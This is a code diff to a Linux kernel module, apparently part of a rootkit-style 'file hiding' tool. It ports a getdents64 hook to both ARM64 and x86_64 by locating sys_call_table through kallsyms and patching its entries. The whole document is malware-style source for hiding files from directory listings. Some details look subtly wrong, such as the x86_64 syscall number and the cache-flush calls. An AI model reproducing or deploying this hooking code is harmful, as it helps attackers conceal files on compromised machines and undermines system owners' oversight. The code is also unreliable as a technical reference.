@@ -1,6 +1,6 @@
 /*
  * hook_manager.c - Hook core manager
- * File hiding module for ARM64
+ * File hiding module for ARM64/x86_64
  * Uses syscall table hook instead of kprobe
  */
 
@@ -10,6 +10,7 @@
 #include <linux/string.h>
 #include <linux/unistd.h>
 #include <linux/uaccess.h>
+#include <linux/kallsyms.h>
 
 #include "hook.h"
 
@@ -24,44 +25,42 @@ static int hidden_count = 0;
 static DEFINE_SPINLOCK(hidden_lock);
 
 /* Syscall hook support */
-#ifdef CONFIG_ARM64
-#include <asm/syscall.h>
-#include <asm/thread_info.h>
-
-/* syscall number for getdents64 */
+#ifdef __aarch64__
+/* ARM64 syscall numbers */
+#ifndef __NR_getdents64
 #define __NR_getdents64 61
-
-typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *regs);
-static syscall_fn_t orig_getdents64;
-
-static void __user *get_dirent_ptr(const struct pt_regs *regs)
-{
-    return (void __user *)regs->regs[1];
-}
-
-static int get_dirent_count(const struct pt_regs *regs)
-{
-    return (int)regs->regs[2];
-}
-#else
-/* x86_64 support */
-#include <asm/processor.h>
-
-#define __NR_getdents64 61
-
-typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *regs);
-static syscall_fn_t orig_getdents64;
-
-static void __user *get_dirent_ptr(const struct pt_regs *regs)
-{
-    return (void __user *)regs->di;
-}
-
-static int get_dirent_count(const struct pt_regs *regs)
-{
-    return (int)regs->si;
-}
 #endif
+
+typedef asmlinkage long (*orig_syscall_fn_t)(const struct pt_regs *regs);
+#else
+/* x86_64 syscall numbers */
+#ifndef __NR_getdents64
+#define __NR_getdents64 61
+#endif
+
+typedef asmlinkage long (*orig_syscall_fn_t)(const struct pt_regs *regs);
+#endif
+
+static orig_syscall_fn_t orig_getdents64;
+
+/* Platform-specific syscall parameter access */
+static inline void __user *get_dirent_ptr(const struct pt_regs *regs)
+{
+#ifdef __aarch64__
+    return (void __user *)regs->regs[1];
+#else
+    return (void __user *)regs->di;
+#endif
+}
+
+static inline int get_dirent_count(const struct pt_regs *regs)
+{
+#ifdef __aarch64__
+    return (int)regs->regs[2];
+#else
+    return (int)regs->si;
+#endif
+}
 
 int add_hidden_file(const char *name, bool is_dir)
 {
@@ -243,16 +242,13 @@ extern int vfs_hook_init(void);
 extern void vfs_hook_exit(void);
 
 /* Syscall table handling */
-#ifdef CONFIG_ARM64
-#include <asm/cacheflush.h>
+static void **syscall_table;
 
-extern void *kallsyms_lookup_name(const char *name);
-
-static void **get_syscall_table(void)
+static inline void **get_syscall_table(void)
 {
     void **table;
 
-    /* Try to find sys_call_table via kallsyms */
+    /* Find sys_call_table via kallsyms */
     table = (void **)kallsyms_lookup_name("sys_call_table");
     if (!table) {
         pr_err("hook: failed to find sys_call_table\n");
@@ -263,10 +259,11 @@ static void **get_syscall_table(void)
     return table;
 }
 
-static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
-{
-    extern void __flush_icache_range(unsigned long, unsigned long);
+#ifdef __aarch64__
+#include <asm/cacheflush.h>
 
+static inline int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
+{
     if (!table || nr < 0)
         return -EINVAL;
 
@@ -275,13 +272,11 @@ static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
         *old_fn = table[nr];
 
     /* Clear icache and patch */
-    flush_cache_vmap((unsigned long)&table[nr],
-                     (unsigned long)&table[nr] + sizeof(void *));
-
+    flush_icache_range((unsigned long)&table[nr],
+                       (unsigned long)&table[nr] + sizeof(void *));
     table[nr] = new_fn;
-
-    flush_cache_vmap((unsigned long)&table[nr],
-                     (unsigned long)&table[nr] + sizeof(void *));
+    flush_icache_range((unsigned long)&table[nr],
+                       (unsigned long)&table[nr] + sizeof(void *));
     dsb(ish);
     isb();
 
@@ -290,22 +285,7 @@ static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
 }
 #else
 /* x86_64 fallback */
-#include <asm/cacheflush.h>
-
-extern void *kallsyms_lookup_name(const char *name);
-
-static void **get_syscall_table(void)
-{
-    void **table = (void **)kallsyms_lookup_name("sys_call_table");
-    if (!table) {
-        pr_err("hook: failed to find sys_call_table\n");
-        return NULL;
-    }
-    pr_info("hook: sys_call_table found at %px\n", table);
-    return table;
-}
-
-static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
+static inline int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
 {
     if (!table || nr < 0)
         return -EINVAL;
@@ -319,7 +299,6 @@ static int patch_syscall(void **table, int nr, void *new_fn, void **old_fn)
 }
 #endif
 
-static void **syscall_table;
 static bool syscall_hooked;
 
 static int __init hook_init(void)
